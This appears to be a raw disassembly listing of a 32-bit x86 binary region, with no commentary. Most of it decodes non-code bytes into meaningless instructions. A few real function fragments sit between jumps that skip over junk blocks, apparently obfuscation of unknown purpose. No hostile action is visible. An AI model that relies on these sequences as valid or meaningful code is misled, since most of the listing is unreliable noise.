  4139f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f2:	cld    
  4139f3:	mov    ebx,0xbd28b98a
  4139f8:	and    edi,esi
  4139fa:	pop    edx
  4139fb:	sbb    dl,BYTE PTR [eax+0x2ebe37c]
  413a01:	pop    ebx
  413a02:	mov    ecx,0x3c323975
  413a07:	les    edx,FWORD PTR [ecx+eiz*1]
  413a0a:	xchg   edx,eax
  413a0b:	std    
  413a0c:	sbb    DWORD PTR [eax*1+0x3a4b0ae4],edi
  413a13:	stc    
  413a14:	and    eax,eax
  413a16:	xchg   ecx,eax
  413a17:	and    DWORD PTR [edi],ebx
  413a19:	jne    0x4139bd
  413a1b:	bound  edx,QWORD PTR ds:0x7efd
  413a20:	nop
  413a21:	xchg   ebx,eax
  413a22:	iret   
  413a23:	int3   
  413a24:	push   ebp
  413a25:	dec    esp
  413a26:	cmp    al,0x64
  413a28:	jmp    0xb5c0460e
  413a2d:	stos   BYTE PTR es:[edi],al
  413a2e:	out    dx,eax
  413a2f:	add    eax,0x6b9dd37f
  413a34:	jl     0x413a4a
  413a36:	xor    DWORD PTR [ebx-0x1ee1de98],esi
  413a3c:	mov    ds:0x5edfad9a,al
  413a41:	mov    BYTE PTR [edx+0x765c2b5d],ch
  413a47:	or     al,al
  413a49:	sbb    eax,0xe43f860b
  413a4e:	daa    
  413a4f:	pop    eax
  413a50:	jnp    0x4139e5
  413a52:	or     eax,0xa6b49b37
  413a57:	xlat   BYTE PTR ds:[ebx]
  413a58:	dec    edx
  413a59:	adc    DWORD PTR [ebx+0x72],0x1cd9ab45
  413a60:	shl    DWORD PTR [ebx],0x9
  413a63:	inc    esi
  413a64:	and    BYTE PTR [edi+0x39],ah
  413a67:	jno    0x413adb
  413a69:	and    esi,DWORD PTR [ebx]
  413a6b:	and    ebx,DWORD PTR [ebp+0x5]
  413a6e:	mov    ah,0x80
  413a70:	mov    bh,ah
  413a72:	inc    ebp
  413a73:	or     al,0xef
  413a75:	test   BYTE PTR [ecx+edi*1+0x52],0xb1
  413a7a:	sbb    eax,0xbb5b3941
  413a7f:	outs   dx,BYTE PTR ds:[esi]
  413a80:	cs pop eax
  413a82:	ins    BYTE PTR es:[edi],dx
  413a83:	add    al,0x44
  413a85:	or     edx,DWORD PTR [ebp-0x2da6da96]
  413a8b:	ins    BYTE PTR es:[edi],dx
  413a8c:	pop    es
  413a8d:	mov    ebx,DWORD PTR [ebx+0x2f]
  413a90:	xor    ebp,DWORD PTR [esp+eax*4]
  413a93:	xlat   BYTE PTR ds:[ebx]
  413a94:	aas    
  413a95:	pop    edx
  413a96:	push   es
  413a97:	xor    BYTE PTR [edx+0xd774b56],cl
  413a9d:	icebp  
  413a9e:	mov    bh,al
  413aa0:	mov    dl,0x34
  413aa2:	push   ecx
  413aa3:	push   es
  413aa4:	out    dx,eax
  413aa5:	dec    ebp
  413aa6:	mov    al,ds:0x6b63cdb8
  413aab:	popa   
  413aac:	lock jne 0x413a6f
  413aaf:	out    dx,eax
  413ab0:	test   al,0x34
  413ab2:	xlat   BYTE PTR ds:[ebx]
  413ab3:	(bad)  
  413ab4:	push   esi
  413ab5:	dec    ecx
  413ab6:	mov    ebx,esp
  413ab8:	add    dl,BYTE PTR [edx]
  413aba:	push   esp
  413abb:	gs ret 0x1ae8
  413abf:	call   0xf937:0x3048d871
  413ac6:	and    al,BYTE PTR [edx]
  413ac8:	popf   
  413ac9:	test   DWORD PTR [esi+0x6ff15c7],ecx
  413acf:	aad    0x4
  413ad1:	fsubr  DWORD PTR [esi+0x18]
  413ad4:	sub    bh,ch
  413ad6:	and    edx,DWORD PTR [edi+0x16e45cea]
  413adc:	sar    esp,1
  413ade:	push   eax
  413adf:	jg     0x413ad7
  413ae1:	inc    edx
  413ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae3:	and    DWORD PTR [edx+0xf9ad5f5],esp
  413ae9:	mov    al,0x42
  413aeb:	push   esi
  413aec:	jg     0x413b4c
  413aee:	inc    ebp
  413aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413af0:	data16 cmp al,0xce
  413af3:	clc    
  413af4:	or     BYTE PTR [ecx],0x50
  413af7:	xor    BYTE PTR [ebp+ecx*1-0x21b52b0f],ah
  413afe:	dec    esi
  413aff:	xor    al,0xfe
  413b01:	ret    
  413b02:	mov    cl,0x69
  413b04:	std    
  413b05:	push   ebp
  413b06:	push   esi
  413b07:	jmp    0x413b76
  413b09:	xchg   eax,ecx
  413b0b:	les    esp,FWORD PTR [esi+0x19]
  413b0e:	mov    bh,0x2b
  413b10:	mov    BYTE PTR [edx+0x58],dl
  413b13:	pop    ecx
  413b14:	arpl   WORD PTR [eax],di
  413b16:	pop    edx
  413b17:	pop    eax
  413b18:	and    eax,0xe44c6c6e
  413b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b1e:	xor    DWORD PTR [esi-0xa9eb017],ebx
  413b24:	ret    0xf8a7
  413b27:	repz adc DWORD PTR [ecx-0x60],ebx
  413b2b:	mov    esi,0x4fa00a30
  413b30:	xchg   ebx,eax
  413b31:	xor    al,0x10
  413b33:	jg     0x413ad3
  413b35:	(bad)  
  413b36:	std    
  413b37:	clc    
  413b38:	mov    ebp,0x76e1bae2
  413b3d:	mov    eax,ds:0xdb52f858
  413b42:	cmp    DWORD PTR [esi+0x2a],ebx
  413b45:	ret    
  413b46:	stos   BYTE PTR es:[edi],al
  413b47:	mov    fs,WORD PTR [esi]
  413b49:	mov    edi,0x8281e420
  413b4e:	or     ebx,DWORD PTR ss:[ecx+0x7f]
  413b52:	scas   eax,DWORD PTR es:[edi]
  413b53:	ins    BYTE PTR es:[edi],dx
  413b54:	ins    BYTE PTR es:[edi],dx
  413b55:	cmc    
  413b56:	mov    ah,0x9
  413b58:	or     BYTE PTR [ebx+0x3b],dl
  413b5b:	js     0x413bd3
  413b5d:	(bad)  
  413b5e:	xchg   ebp,eax
  413b5f:	addr16 mov ebp,0x1fa61a82
  413b65:	push   ss
  413b66:	add    BYTE PTR [ecx+edi*2+0x66],ch
  413b6a:	mov    ds:0x9a6bae0a,al
  413b6f:	sub    al,0x71
  413b71:	call   0xdd635ee4
  413b76:	mov    eax,ds:0xa42741f0
  413b7b:	push   0x4e7d31b9
  413b80:	mov    cl,al
  413b82:	lods   eax,DWORD PTR ds:[esi]
  413b83:	pop    ebp
  413b84:	xchg   ebp,eax
  413b85:	out    0xff,eax
  413b87:	or     al,0x8b
  413b89:	sbb    eax,0x8eeb0479
  413b8e:	push   edi
  413b8f:	in     al,0xe5
  413b91:	mov    ebp,0xa7cca145
  413b96:	lods   eax,DWORD PTR ds:[esi]
  413b97:	add    DWORD PTR [esp+eiz*8],edx
  413b9a:	fs sti 
  413b9c:	adc    eax,0x68a3eba1
  413ba1:	push   esi
  413ba2:	rcr    dl,1
  413ba4:	ja     0x413c01
  413ba6:	sbb    eax,DWORD PTR [ebp+edx*1-0x13]
  413baa:	sub    cl,BYTE PTR [edi-0x72]
  413bad:	sub    DWORD PTR [ebx-0x31],ecx
  413bb0:	sbb    DWORD PTR [edx],0xd86e11cd
  413bb6:	jecxz  0x413bd1
  413bb8:	mov    dl,BYTE PTR [edx]
  413bba:	mov    bl,0xd9
  413bbc:	scas   al,BYTE PTR es:[edi]
  413bbd:	cmp    eax,0x787e1cd5
  413bc2:	jo     0x413b95
  413bc4:	mov    al,0x88
  413bc6:	jmp    DWORD PTR [ebp+0x27a571ed]
  413bcc:	sub    cl,BYTE PTR [ecx+0x47]
  413bcf:	pop    es
  413bd0:	mov    ebx,0x26f6a3b7
  413bd5:	mov    ebx,DWORD PTR [esi*4+0x67cddc6b]
  413bdc:	mov    eax,0x9ba71b7b
  413be1:	js     0x413bc5
  413be3:	jp     0x413bac
  413be5:	sub    eax,0x404ad796
  413bea:	jnp    0x413c3b
  413bec:	(bad)  
  413bed:	or     bl,bl
  413bef:	jmp    0x413bdf
  413bf1:	xchg   esi,eax
  413bf2:	not    BYTE PTR [ecx]
  413bf4:	mov    cl,0xd
  413bf6:	lds    ebx,FWORD PTR [ebx+0x77]
  413bf9:	cld    
  413bfa:	iret   
  413bfb:	pop    edx
  413bfc:	in     eax,0x69
  413bfe:	mov    ah,0x30
  413c00:	or     al,0xb7
  413c02:	xlat   BYTE PTR ds:[ebx]
  413c03:	xchg   edx,eax
  413c04:	xchg   BYTE PTR [ecx],al
  413c06:	sbb    esi,0x1675c951
  413c0c:	fcmovne st,st(2)
  413c0e:	(bad)  
  413c11:	add    BYTE PTR [esi+0x26],ah
  413c14:	jecxz  0x413c2c
  413c16:	push   es
  413c17:	dec    edi
  413c18:	sub    eax,0x64952a70
  413c1d:	imul   ecx,DWORD PTR [eax-0x1b],0xb3f356e4
  413c24:	daa    
  413c25:	cmp    eax,0x5574f0b1
  413c2a:	xchg   ebp,eax
  413c2b:	push   0xfffffff4
  413c2d:	mov    esi,0xcb11c010
  413c32:	fsubp  st(2),st
  413c34:	and    al,0x31
  413c36:	cwde   
  413c37:	add    dl,BYTE PTR [eax-0x6d]
  413c3a:	popa   
  413c3b:	add    dl,BYTE PTR [ecx]
  413c3d:	jo     0x413c0d
  413c3f:	aad    0x3d
  413c41:	sbb    DWORD PTR [eax],ecx
  413c43:	adc    al,0xa0
  413c45:	mov    esp,0xfc140f2d
  413c4a:	xchg   ecx,eax
  413c4b:	mov    bl,BYTE PTR [edx+0x58]
  413c4e:	ja     0x413be4
  413c50:	xor    ebp,DWORD PTR [edi+0x65]
  413c53:	pandn  mm0,mm2
  413c56:	stc    
  413c57:	cld    
  413c58:	ins    DWORD PTR es:[edi],dx
  413c59:	xchg   DWORD PTR [edi+0x2fa36dde],esp
  413c5f:	into   
  413c60:	lods   al,BYTE PTR ds:[esi]
  413c61:	push   0x6a
  413c63:	xchg   ebp,eax
  413c64:	add    ecx,eax
  413c66:	aas    
  413c67:	inc    edi
  413c68:	push   ss
  413c69:	xor    BYTE PTR cs:[eax-0x7b643eb8],ch
  413c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c71:	fs mov dl,0xb1
  413c74:	dec    eax
  413c75:	cdq    
  413c76:	mov    ah,0xdf
  413c78:	enter  0x7c37,0x58
  413c7c:	fistp  QWORD PTR [eax-0x76]
  413c7f:	lahf   
  413c80:	mov    al,ds:0xac8bf26b
  413c85:	ss pop edx
  413c87:	iret   
  413c88:	in     al,0xa8
  413c8a:	lods   eax,DWORD PTR ds:[esi]
  413c8b:	mov    BYTE PTR [ebp-0x1b94d733],bl
  413c91:	leave  
  413c92:	test   BYTE PTR [edx-0x1985b392],bl
  413c98:	into   
  413c99:	sub    ecx,DWORD PTR [esi]
  413c9b:	addr16 gs mov eax,edx
  413c9f:	lds    edx,FWORD PTR [ecx+ecx*1+0x7b9b194d]
  413ca6:	(bad)  
  413ca7:	xor    BYTE PTR [ecx+0x10033cad],bl
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	dec    esp
  413cff:	jmp    0x1818:0x32896a08
  413d06:	stos   BYTE PTR es:[edi],al
  413d07:	adc    bl,BYTE PTR [eax]
  413d09:	sbb    BYTE PTR [edi-0x13d72e6a],ch
  413d0f:	and    BYTE PTR [edx],cl
  413d11:	inc    eax
  413d12:	push   ss
  413d13:	and    BYTE PTR [edx],0x91
  413d16:	dec    edx
  413d17:	fstp   QWORD PTR [esi+ebp*1-0x4de526dc]
  413d1e:	mov    bh,0x33
  413d20:	adc    ebx,ecx
  413d22:	sub    DWORD PTR ds:0x6e01ff8e,eax
  413d28:	inc    esp
  413d29:	fild   WORD PTR [edx]
  413d2b:	mov    cl,0x14
  413d2d:	sub    BYTE PTR [esi-0x65148711],dl
  413d33:	ror    BYTE PTR [esi-0x4a],cl
  413d36:	inc    edx
  413d37:	ins    BYTE PTR es:[edi],dx
  413d38:	push   ds
  413d39:	push   edi
  413d3a:	add    BYTE PTR [edi-0x6c],0x61
  413d3e:	jno    0x413cdf
  413d40:	scas   al,BYTE PTR es:[edi]
  413d41:	popf   
  413d42:	push   ss
  413d43:	hlt    
  413d44:	mov    ch,0x1d
  413d46:	jo     0x413d37
  413d48:	sti    
  413d49:	push   ebp
  413d4a:	test   eax,0x961c65c4
  413d4f:	arpl   WORD PTR [edi+0x53108d91],bx
  413d55:	push   ebp
  413d56:	sub    dh,BYTE PTR [bp+di+0x4a]
  413d5a:	bound  ebp,QWORD PTR [ebp-0x5d]
  413d5d:	(bad)  
  413d5e:	xchg   esi,eax
  413d5f:	or     eax,0x475c8660
  413d64:	fcomp  QWORD PTR [ebx+0x6b]
  413d67:	test   eax,0x7018240a
  413d6c:	and    bl,BYTE PTR [edx+0x6bda3b5c]
  413d72:	add    al,0xd2
  413d74:	cmp    ecx,DWORD PTR [eax]
  413d76:	mov    esi,0x8d841099
  413d7b:	dec    edx
  413d7c:	jns    0x413d8d
  413d7e:	sub    bl,BYTE PTR [ebp+ebp*4-0x17c25f02]
  413d85:	pop    ds
  413d86:	jno    0x413d96
  413d88:	ret    
  413d89:	dec    ebx
  413d8a:	loopne 0x413ddd
  413d8c:	ins    BYTE PTR es:[edi],dx
  413d8d:	(bad)  
  413d8f:	jl     0x413d32
  413d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d92:	dec    esi
  413d93:	xchg   esi,eax
  413d94:	loop   0x413de6
  413d96:	fwait
  413d97:	push   cs
  413d98:	mov    ds:0x7dd30909,eax
  413d9d:	popf   
  413d9e:	call   0xdc3a:0x8cc8f48
  413da5:	xchg   edx,eax
  413da6:	sbb    cl,bl
  413da8:	push   0x17
  413daa:	mov    ah,ah
  413dac:	dec    edi
  413dad:	sub    ecx,esp
  413daf:	push   0xffffff84
  413db1:	push   esi
  413db2:	(bad)  
  413db3:	leave  
  413db4:	sub    eax,0x912c80cf
  413db9:	add    dl,BYTE PTR [ecx+0x46]
  413dbc:	ret    
  413dbd:	lock popa 
  413dbf:	fisubr DWORD PTR [edi]
  413dc1:	xchg   dl,bh
  413dc3:	sbb    DWORD PTR [ebx+0x76],0xdcc6db91
  413dca:	pop    edi
  413dcb:	nop
  413dcc:	es add al,0xb
  413dcf:	cmovo  edi,DWORD PTR [edi]
  413dd2:	lods   al,BYTE PTR ds:[esi]
  413dd3:	jb     0x413e06
  413dd5:	push   edi
  413dd6:	hlt    
  413dd7:	sti    
  413dd8:	xchg   ebp,eax
  413dd9:	sub    DWORD PTR [edx+0x647697d3],esi
  413ddf:	pop    ds
  413de0:	and    BYTE PTR [esi+0x5dec9c6d],bh
  413de6:	pop    ss
  413de7:	gs mov ah,bl
  413dea:	xchg   ebx,eax
  413deb:	rol    DWORD PTR [ecx+0x6c7d9373],1
  413df1:	mov    ah,0xa6
  413df3:	cmp    eax,0x25a871dd
  413df8:	jnp    0x413e24
  413dfa:	aas    
  413dfb:	push   es
  413dfc:	xchg   ebp,eax
  413dfd:	jmp    0x14c6:0x8e3b70b
  413e04:	xor    DWORD PTR [esi],ebx
  413e06:	mov    esp,0x37a8223b
  413e0b:	pusha  
  413e0c:	jmp    0x413e5d
  413e0e:	xchg   esi,eax
  413e0f:	ror    DWORD PTR [eax+0x7a],1
  413e12:	fs ret 0x7373
  413e16:	mov    eax,ds:0xcfebc55d
  413e1b:	je     0x413e2f
  413e1d:	push   ebx
  413e1e:	ins    BYTE PTR es:[edi],dx
  413e1f:	mov    ch,0x51
  413e21:	leave  
  413e22:	sub    BYTE PTR [edx],ah
  413e24:	ror    DWORD PTR [ecx-0x1fc6adc3],cl
  413e2a:	jns    0x413e6a
  413e2c:	add    al,0xb8
  413e2e:	loope  0x413e33
  413e30:	xchg   esi,eax
  413e31:	push   cs
  413e32:	js     0x413e65
  413e34:	gs retf 0xcac8
  413e38:	jmp    0x4d83e0ee
  413e3d:	fistp  WORD PTR [ebx+0x4b]
  413e40:	and    eax,0xde8422b7
  413e45:	push   0x7ecd5114
  413e4a:	out    dx,al
  413e4b:	mov    esi,0x175d72e5
  413e50:	pop    eax
  413e51:	xchg   edi,eax
  413e52:	mov    cl,0xb9
  413e54:	pushf  
  413e55:	imul   edi,DWORD PTR [eax],0x7b
  413e58:	push   ds
  413e59:	cmp    DWORD PTR [eax-0x19576339],ebp
  413e5f:	mov    ecx,esp
  413e61:	inc    ebp
  413e62:	call   0x988a:0xe0a43a1a
  413e69:	or     bl,bh
  413e6b:	ret    
  413e6c:	stos   BYTE PTR es:[edi],al
  413e6d:	shl    bl,0xe2
  413e70:	das    
  413e71:	push   edi
  413e72:	not    BYTE PTR [esi]
  413e74:	jg     0x413e55
  413e76:	push   cs
  413e77:	and    eax,eax
  413e79:	gs push ss
  413e7b:	adc    al,ch
  413e7d:	push   esi
  413e7e:	out    dx,eax
  413e7f:	inc    eax
  413e80:	mov    ebp,0xeaf2e457
  413e85:	cmp    eax,DWORD PTR [edx]
  413e87:	xchg   DWORD PTR [edx],eax
  413e89:	cmp    DWORD PTR [edi+0x24],edi
  413e8c:	(bad)  [edi-0xd29b700]
  413e92:	dec    ecx
  413e93:	add    bl,0x36
  413e96:	popf   
  413e97:	dec    edx
  413e98:	cmp    BYTE PTR [edi-0x3e],bh
  413e9b:	popf   
  413e9c:	jmp    0x874b:0x2176ba64
  413ea3:	push   ds
  413ea4:	xor    BYTE PTR [edi+ecx*1],dh
  413ea7:	sbb    eax,0x61fe142d
  413eac:	pusha  
  413ead:	and    BYTE PTR [ecx],dl
  413eaf:	(bad)  
  413eb0:	test   BYTE PTR [edx-0x774919b6],0xb5
  413eb7:	nop
  413eb8:	in     al,dx
  413eb9:	add    DWORD PTR [ebx],esi
  413ebb:	scas   al,BYTE PTR es:[edi]
  413ebc:	lahf   
  413ebd:	cmp    eax,esi
  413ebf:	retf   
  413ec0:	dec    esi
  413ec1:	and    DWORD PTR [eax],esi
  413ec3:	lods   eax,DWORD PTR ds:[esi]
  413ec4:	jecxz  0x413f43
  413ec6:	daa    
  413ec7:	cld    
  413ec8:	push   fs
  413eca:	ins    BYTE PTR es:[edi],dx
  413ecb:	cs faddp st(7),st
  413ece:	out    0x64,eax
  413ed0:	xchg   esi,eax
  413ed1:	mov    WORD PTR [ecx],ds
  413ed3:	sar    BYTE PTR [edi-0x4911b811],0xf3
  413eda:	fdivr  DWORD PTR [edx]
  413edc:	xchg   ebx,eax
  413edd:	sbb    DWORD PTR [edx],ecx
  413edf:	sbb    al,0x22
  413ee1:	pop    esi
  413ee2:	adc    eax,0x558f7089
  413ee7:	inc    ecx
  413ee8:	sub    eax,0xabcbe5ba
  413eed:	test   eax,0xb851f2c
  413ef2:	jge    0x413ebb
  413ef4:	xchg   ebp,eax
  413ef5:	retf   0xbbc4
  413ef8:	cmp    dl,BYTE PTR [eax+0x304ff7d5]
  413efe:	sti    
  413eff:	inc    edx
  413f00:	sbb    al,bl
  413f02:	add    ebx,DWORD PTR ds:0xf8766172
  413f08:	mov    bh,0x73
  413f0a:	aam    0x2c
  413f0c:	sbb    ebp,ebp
  413f0e:	aas    
  413f0f:	cwde   
  413f10:	mov    eax,ds:0x5f5d9d17
  413f15:	sbb    eax,DWORD PTR [edi-0x64]
  413f18:	push   cs
  413f19:	neg    cl
  413f1b:	sti    
  413f1c:	std    
  413f1d:	ret    
  413f1e:	xor    DWORD PTR [ebp-0x537267a3],0xccb6487c
  413f28:	pop    ds
  413f29:	push   ds
  413f2a:	icebp  
  413f2b:	(bad)  
  413f2d:	mov    esi,0x4b4e800c
  413f32:	push   cs
  413f33:	cmp    al,0x44
  413f35:	adc    al,0xd6
  413f37:	jmp    0x77a823c2
  413f3c:	jg     0x413f6e
  413f3e:	pushf  
  413f3f:	inc    esi
  413f40:	(bad)  
  413f41:	cmc    
  413f42:	shl    bl,1
  413f44:	cmc    
  413f45:	sbb    eax,0x8f0269cc
  413f4a:	jno    0x413fc3
  413f4c:	clc    
  413f4d:	test   BYTE PTR [eax+0x3579be0d],bh
  413f53:	mov    dl,0xae
  413f55:	rcr    BYTE PTR [edi+0x26],0x8f
  413f59:	ds jp  0x413f24
  413f5c:	xchg   edi,eax
  413f5d:	in     eax,dx
  413f5e:	(bad)  
  413f60:	test   eax,0x3d3ecf43
  413f65:	add    al,0x60
  413f67:	dec    esi
  413f68:	and    BYTE PTR [esi-0x37c1e986],dh
  413f6e:	adc    BYTE PTR [ecx+0xe4c4469],ah
  413f74:	pushf  
  413f75:	jl     0x413f0f
  413f77:	loope  0x413f4a
  413f79:	loope  0x413fe8
  413f7b:	nop
  413f7c:	(bad)  
  413f7d:	stos   DWORD PTR es:[edi],eax
  413f7e:	mov    ecx,0xcb959ffa
  413f83:	inc    esp
  413f84:	xor    DWORD PTR [eax+0x127cd938],0x8b59b5a0
  413f8e:	lods   al,BYTE PTR ds:[esi]
  413f8f:	pop    ecx
  413f90:	mov    ds:0xf6aab274,al
  413f95:	jmp    0x413fe3
  413f97:	jp     0x413f4e
  413f99:	add    BYTE PTR [edx+0x1df26b17],cl
  413f9f:	hlt    
  413fa0:	cmp    cl,bh
  413fa2:	and    eax,0x1a91b357
  413fa7:	mov    esi,0x31bdea4e
  413fac:	icebp  
  413fad:	inc    esp
  413fae:	fs mov eax,0xd38a12a
  413fb4:	add    DWORD PTR [edx-0x3a2c4ed],ebx
  413fba:	xor    eax,0x4610fc04
  413fbf:	push   ebx
  413fc0:	dec    eax
  413fc1:	loopne 0x413f9b
  413fc3:	push   ebx
  413fc4:	fwait
  413fc5:	je     0x413fc7
  413fc7:	mov    BYTE PTR [ebx-0x5d8c64a8],bh
  413fcd:	loope  0x413fe9
  413fcf:	pop    edi
  413fd0:	sub    ebx,ecx
  413fd2:	push   cs
  413fd3:	adc    BYTE PTR [esi],ah
  413fd5:	gs jg  0x413fde
  413fd8:	sub    eax,DWORD PTR [ebp+0x220cbb0b]
  413fde:	nop
  413fdf:	(bad)  
  413fe0:	rcl    DWORD PTR [ecx],0x11
  413fe3:	int    0x71
  413fe5:	xchg   ebx,eax
  413fe6:	mov    edi,0xaa37011f
  413feb:	cmp    DWORD PTR [esi],esi
  413fed:	mul    edi
  413fef:	push   ecx
  413ff0:	std    
  413ff1:	push   esi
  413ff2:	das    
  413ff3:	pop    ebx
  413ff4:	mov    cs,WORD PTR [esp+ebx*4+0xb]
  413ff8:	pop    edx
  413ff9:	cdq    
  413ffa:	ss scas al,BYTE PTR es:[edi]
  413ffc:	mov    ch,0x9f
  413ffe:	pop    esi
  413fff:	sbb    DWORD PTR [esi+0xf],eax
  414002:	arpl   WORD PTR [esi],sp
  414004:	sti    
  414005:	repz pop esi
  414007:	jno    0x413fd3
  414009:	add    al,0x95
  41400b:	icebp  
  41400c:	hlt    
  41400d:	test   BYTE PTR [ecx],0x8c
  414010:	sbb    DWORD PTR [edi],eax
  414012:	repz inc eax
  414014:	inc    ecx
  414015:	inc    edx
  414016:	inc    esi
  414017:	jo     0x41403c
  414019:	mov    al,0xb1
  41401b:	outs   dx,DWORD PTR ds:[esi]
  41401c:	mov    ebx,0x753e11e2
  414021:	jno    0x41400d
  414023:	and    ch,ch
  414025:	aaa    
  414026:	jmp    0x12e6:0x23f087c3
  41402d:	mov    cl,0x3a
  41402f:	psubw  mm1,mm1
  414032:	mov    esp,0xbb450947
  414037:	cmp    al,0xde
  414039:	lods   eax,DWORD PTR ds:[esi]
  41403a:	retf   
  41403b:	and    eax,0x1e0eff92
  414040:	add    DWORD PTR [esi],ebx
  414042:	cmp    eax,0x9fb19586
  414047:	fs pop ebx
  414049:	add    al,0xd5
  41404b:	mov    WORD PTR [edx],fs
  41404d:	jp     0x4140a4
  41404f:	mov    bl,0x5d
  414051:	pop    esp
  414052:	mov    edx,0xa98a491c
  414057:	loope  0x41403d
  414059:	lock mov cl,0x4d
  41405c:	lea    edi,[edx+0x1e]
  41405f:	arpl   WORD PTR [ecx+0x5ec6d36e],cx
  414065:	aam    0xb3
  414067:	aas    
  414068:	add    al,0xd7
  41406a:	std    
  41406b:	adc    DWORD PTR [ebx+0x56],ecx
  41406e:	pop    es
  41406f:	leave  
  414070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414071:	or     edi,eax
  414073:	xchg   esp,eax
  414074:	push   ebp
  414075:	stos   DWORD PTR es:[edi],eax
  414076:	cli    
  414077:	mov    eax,0x3adfe91c
  41407c:	sub    BYTE PTR [edi-0x45db83ce],dh
  414082:	push   cs
  414083:	jg     0x414103
  414085:	xlat   BYTE PTR ds:[ebx]
  414086:	pop    ss
  414087:	jno    0x414089
  414089:	lahf   
  41408a:	jge    0x41408d
  41408c:	mov    bh,0x89
  41408e:	jae    0x4140ce
  414090:	adc    eax,0xa5f1200a
  414095:	(bad)  
  414096:	xor    ebp,DWORD PTR [ecx+ebp*1]
  414099:	idiv   DWORD PTR [edx]
  41409b:	and    al,0x10
  41409d:	cmp    edi,ebp
  41409f:	rcr    DWORD PTR [ebx-0x7d],1
  4140a2:	fcmovne st,st(6)
  4140a4:	loop   0x4140fc
  4140a6:	mov    cl,0x90
  4140a8:	test   DWORD PTR [edx],ebx
  4140aa:	mov    bl,0xb
  4140ac:	inc    edx
  4140ad:	bnd jmp 0x44a46020
  4140b3:	or     BYTE PTR [esi],ch
  4140b5:	adc    eax,DWORD PTR [edi-0x77]
  4140b8:	fistp  QWORD PTR [eax-0x3c6d0ee]
  4140be:	in     al,0xee
  4140c0:	cld    
  4140c1:	fisttp WORD PTR [edx]
  4140c3:	xchg   edi,eax
  4140c4:	mov    esp,0xc4758957
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x4220c5
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebp+ecx*8-0x69]
  414159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415a:	mov    esp,0x18182c1a
  41415f:	rcl    BYTE PTR [edx],1
  414161:	sbb    BYTE PTR [eax],bl
  414163:	mov    cl,0xe4
  414165:	cmp    ah,cl
  414167:	jmp    0xe913f839
  41416c:	push   edi
  41416d:	or     esi,DWORD PTR gs:[esp+ebp*2+0x71d16f73]
  414175:	or     esp,0xffffffc4
  414178:	stos   BYTE PTR es:[edi],al
  414179:	push   0x4ce04671
  41417e:	or     edx,esp
  414180:	add    cl,BYTE PTR ds:0xb417a189
  414186:	mov    edx,0x8660a3ea
  41418b:	or     eax,0x65cb543
  414190:	add    DWORD PTR [esi+0x56],esi
  414193:	dec    eax
  414194:	repz jno 0x414156
  414197:	or     eax,0x34d551f0
  41419c:	mov    edx,0x7bb52e3c
  4141a1:	add    al,0xee
  4141a3:	stc    
  4141a4:	mov    ebp,0x474412a7
  4141a9:	mov    BYTE PTR [esi-0x7b],al
  4141ac:	xor    al,0x5e
  4141ae:	and    edx,ecx
  4141b0:	rol    DWORD PTR [esi],1
  4141b2:	jno    0x92195e83
  4141b8:	dec    edi
